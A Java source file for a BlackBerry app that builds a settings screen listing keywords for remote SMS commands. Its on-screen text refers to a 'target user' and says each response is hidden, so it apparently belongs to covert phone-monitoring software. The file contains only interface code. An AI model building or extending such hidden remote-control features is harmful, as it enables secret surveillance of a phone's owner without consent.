package com.vvt.screen;

import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.pref.Preference;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.std.Log;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.MenuItem;

public class SMSControlScreen extends MainScreen {
	
	private static final String TITLE = "SMS Control Commands";
	private static final String SMS_DEFAULT_MENU = "Use Default Commands";
	private static final String TEXT_HEADER = "\tTo enable you to send remote SMS commands to the Blackberry you need to define ";
	private static final String TEXT_TAILER = " key words which will trigger a response from the device.\n The incoming SMS command cannot be hidden from the target user. Each response is hidden.";
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	private Vector registerCmds = rmtCmdRegister.getCommands();
	private Vector cmdFields = new Vector();
	private SMSControlScreen self = this;
	
	public SMSControlScreen() {
		try {
			setTitle(TITLE);
			addCmds();
			add(new RichTextField(TEXT_HEADER + registerCmds.size() + TEXT_TAILER, Field.READONLY));
			add(new RichTextField("", Field.NON_FOCUSABLE));
			for (int i = 0; i < cmdFields.size(); i++) {
				add((RichTextField)cmdFields.elementAt(i));
			}
		} catch (Exception e) {
			Log.error("SMSControlScreen.constructor", null, e);
		}
	}

	private void addCmds() {
		RichTextField cmdField = null;
		for (int i = 0; i < registerCmds.size(); i++) {
			RmtCmdLine cmdLine = (RmtCmdLine)registerCmds.elementAt(i);
			StringBuffer msg = new StringBuffer();
			msg.append(cmdLine.getMessage());
			msg.append(cmdLine.getCode());
			cmdField = new RichTextField(msg.toString());
			cmdFields.addElement(cmdField);
		}
	}
}